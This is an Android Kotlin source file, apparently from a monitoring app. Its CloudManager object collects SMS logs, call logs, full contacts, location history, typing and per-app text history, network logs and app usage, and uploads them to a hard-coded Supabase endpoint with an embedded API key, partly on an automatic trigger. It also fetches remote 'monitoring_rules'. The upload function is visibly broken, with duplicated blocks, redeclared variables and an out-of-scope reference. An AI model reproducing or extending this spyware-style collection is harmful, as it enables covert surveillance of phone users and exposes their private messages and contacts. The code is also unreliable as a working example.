package com.example.myandroid

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.widget.TextView
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject
import org.json.JSONArray
import java.util.Calendar

object CloudManager {

    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
    fun uploadData(ctx: Context, modules: List<String>, btn: TextView? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val json = JSONObject()
                json.put("device_model", android.os.Build.MODEL)
                json.put("trigger", if (btn != null) "MANUAL" else "AUTO")
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = modules.contains("ALL")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || modules.contains("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                }

                // --- MODULE 2: SMS ---
                if (isAll || modules.contains("sms")) {
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                    json.put("sms_logs", org.json.JSONArray(prefs.getString("sms_logs_cache", "[]")))
                }

                // --- MODULE 3: USAGE ---
                if (isAll || modules.contains("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val calendar = java.util.Calendar.getInstance()
                     calendar.set(java.util.Calendar.HOUR_OF_DAY, 0)
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, calendar.timeInMillis, System.currentTimeMillis())
                     json.put("screen_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.sumOf { it.totalTimeInForeground }))
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || modules.contains("location")) {
                    json.put("location_history", org.json.JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", org.json.JSONArray(prefs.getString("typing_history", "[]")))
                }
                
                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", org.json.JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: PHONE ---
                if (isAll || modules.contains("phone")) {
                     json.put("call_logs", PhoneManager.getCallLogs(ctx))
                     json.put("contacts_dump", PhoneManager.getContacts(ctx))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    json.put("file_skeleton", FileManager.generateReport())
                }
                val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val smsCount = prefs.getInt("sms_count", 0)
                val (netTime, netSessions) = NetworkTracker.getStats(ctx)
                
                val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                val calendar = Calendar.getInstance()
                val endTime = calendar.timeInMillis
                calendar.set(Calendar.HOUR_OF_DAY, 0)
                val startTime = calendar.timeInMillis
                val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
                val totalTimeMillis = stats.sumOf { it.totalTimeInForeground }
                val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalTimeMillis)

                // 2. PREPARE JSON
                val json = JSONObject()
                json.put("device_model", android.os.Build.MODEL)
                json.put("battery_level", level)
                json.put("sms_count", smsCount)
                json.put("screen_time_minutes", totalMins)
                json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime))
                json.put("online_sessions", netSessions)
                // Attach Detailed Logs
                val netLogs = prefs.getString("net_history_log", "[]")
                json.put("network_logs", JSONArray(netLogs))
                // Attach Typing Logs
                val typeLogs = prefs.getString("typing_history", "[]")
                json.put("typing_history", JSONArray(typeLogs))
                
                // Attach Phone Data (Directly from Manager)
                json.put("call_logs", PhoneManager.getCallLogs(ctx))
                json.put("contacts_dump", PhoneManager.getContacts(ctx))

                // --- NEW: SUMMARY STATS AGGREGATION ---
                val summary = JSONObject()
                
                // 1. Location Stats
                val distKm = prefs.getFloat("total_distance_km", 0f)
                summary.put("location_dist_km", distKm)
                
                // 2. Typing Stats
                val typeStats = TypingManager.getStats(ctx)
                summary.put("typing_chars", typeStats.getInt("total_chars"))
                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
                
                // 3. Phone Stats
                val phoneStats = PhoneManager.getStats(ctx)
                summary.put("call_duration_sec", phoneStats.totalDuration)
                summary.put("call_count_total", phoneStats.totalCalls)
                summary.put("call_count_in", phoneStats.incoming)
                summary.put("call_count_out", phoneStats.outgoing)
                summary.put("contact_count", phoneStats.contactCount)
                
                // 4. Notification Stats
                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                
                // 5. Usage Timeline Stats
                val switchCount = UsageManager.getSwitchCount(ctx)
                summary.put("app_switch_count", switchCount)
                
                json.put("summary_stats", summary)
                
                // Attach Full Timeline
                json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                json.put("android_version", android.os.Build.VERSION.RELEASE)
                
                // Attach SMS logs
                // Attach SMS logs
                val rawLogs = prefs.getString("sms_logs_cache", "[]")
                json.put("sms_logs", JSONArray(rawLogs))

                // Attach Text History
                val rawHistory = prefs.getString("text_history_by_app", "{}")
                json.put("text_history", JSONObject(rawHistory))

                // 3. SEND TO SUPABASE

                // Mark if auto-trigger or manual
                json.put("trigger", if (btn == null) "AUTO_NETWORK" else "MANUAL_USER")

                // 3. SEND TO SUPABASE
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                val os = conn.outputStream
                os.write(json.toString().toByteArray())
                os.flush()
                os.close()

                val code = conn.responseCode
                
                // If UI button exists, update it
                if (btn != null) {
                    withContext(Dispatchers.Main) {
                        if (code == 201) {
                            btn.text = "UPLOAD SUCCESS ✅"
                            btn.background.setTint(0xFF2CB67D.toInt())
                        } else {
                             btn.text = "FAILED: $code ❌"
                             btn.background.setTint(0xFFEF4565.toInt())
                        }
                    }
                } else {
                    // Log for background service
                    println("Auto-Backup finished with code: $code")
                }
            } catch (e: Exception) {
                e.printStackTrace()
                if (btn != null) {
                    withContext(Dispatchers.Main) {
                         btn.text = "ERROR: ${e.message}"
                         btn.background.setTint(0xFFEF4565.toInt())
                    }
                }
            }
        }.start()
    }

    fun uploadSkeleton(ctx: Context, json: JSONObject, btn: TextView? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/storage_backups"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true

                conn.outputStream.use { it.write(json.toString().toByteArray()) }
                val code = conn.responseCode

                if (btn != null) {
                    withContext(Dispatchers.Main) {
                        if (code in 200..299) {
                            btn.text = "BACKUP COMPLETE ✅"
                            btn.background.setTint(0xFF2CB67D.toInt())
                        } else {
                            btn.text = "FAILED: $code ❌"
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                if (btn != null) {
                    withContext(Dispatchers.Main) {
                         btn.text = "ERROR: ${e.message}"
                         btn.background.setTint(0xFFEF4565.toInt())
                    }
                }
            }
        }
    }

    fun fetchRules(ctx: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // REMINDER: Use Secrets in real production!
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/monitoring_rules?select=*"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                
                if (conn.responseCode == 200) {
                    val rulesJson = conn.inputStream.bufferedReader().use { it.readText() }
                    
                    // Convert Array to Map for fast lookup
                    val rulesArray = JSONArray(rulesJson)
                    val rulesMap = JSONObject()
                    for (i in 0 until rulesArray.length()) {
                        val item = rulesArray.getJSONObject(i)
                        rulesMap.put(item.getString("package_name"), item)
                    }
                    
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                        .edit()
                        .putString("cached_rules", rulesMap.toString())
                        .apply()
                    println("Rules fetched immediately: ${rulesArray.length()} rules found.")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
}